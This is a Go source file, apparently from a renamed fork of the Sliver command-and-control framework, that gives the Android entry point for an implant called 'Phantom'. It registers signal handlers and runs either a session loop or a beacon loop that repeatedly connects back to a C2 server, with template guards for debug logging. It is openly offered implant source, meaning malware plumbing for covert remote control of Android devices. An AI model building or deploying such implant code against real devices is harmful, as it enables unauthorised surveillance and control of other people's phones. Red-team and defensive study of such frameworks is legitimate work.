//go:build android

package runner

/*
	SUDOSOC-C2 Framework — Android Runner
	Copyright (C) 2026  sudosoc — Seif

	Android-specific entry point for the Phantom implant.
	runner.go's Main() is excluded for android via template guard;
	this file provides the replacement using the same transport
	infrastructure (StartConnectionLoop / StartBeaconLoop).
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/limits"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/transports"
)

// Main - Android implant entry point (replaces runner.go Main for android).
func Main() {
	// {{if .Config.Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	log.Printf("[android] Phantom implant starting")
	// {{end}}

	limits.ExecLimits()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM, syscall.SIGINT, syscall.SIGHUP)
	go func() {
		<-sigCh
		// {{if .Config.Debug}}
		log.Printf("[android] signal received — shutting down")
		// {{end}}
		os.Exit(0)
	}()

	// {{if .Config.IsBeacon}}
	androidBeaconStartup()
	// {{else}}
	androidSessionStartup()
	// {{end}}
}

// androidSessionStartup - session mode using the shared transport loop.
func androidSessionStartup() {
	// {{if .Config.Debug}}
	log.Printf("[android] starting session mode")
	// {{end}}
	abort := make(chan struct{})
	defer func() { abort <- struct{}{} }()
	connections := transports.StartConnectionLoop(abort)
	for connection := range connections {
		if connection != nil {
			err := sessionMainLoop(connection)
			if err != nil {
				if err == ErrTerminate {
					connection.Cleanup()
					return
				}
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("[android] reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}

// androidBeaconStartup - beacon mode using the shared transport loop.
func androidBeaconStartup() {
	// {{if .Config.Debug}}
	log.Printf("[android] starting beacon mode")
	// {{end}}
	abort := make(chan struct{})
	defer func() { abort <- struct{}{} }()
	beacons := transports.StartBeaconLoop(abort)
	for beacon := range beacons {
		// {{if .Config.Debug}}
		log.Printf("[android] next beacon = %v", beacon)
		// {{end}}
		if beacon != nil {
			if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
				continue
			}
			err := beaconMainLoop(beacon)
			if err != nil {
				connectionErrors++
				if transports.GetMaxConnectionErrors() < connectionErrors {
					return
				}
			}
		}
		if c2 := transports.GetC2URI(); c2 != "" && (beacon == nil || c2 != beacon.ActiveC2) {
			continue
		}
		reconnect := transports.GetReconnectInterval()
		// {{if .Config.Debug}}
		log.Printf("[android] reconnect sleep: %s", reconnect)
		// {{end}}
		time.Sleep(reconnect)
	}
}
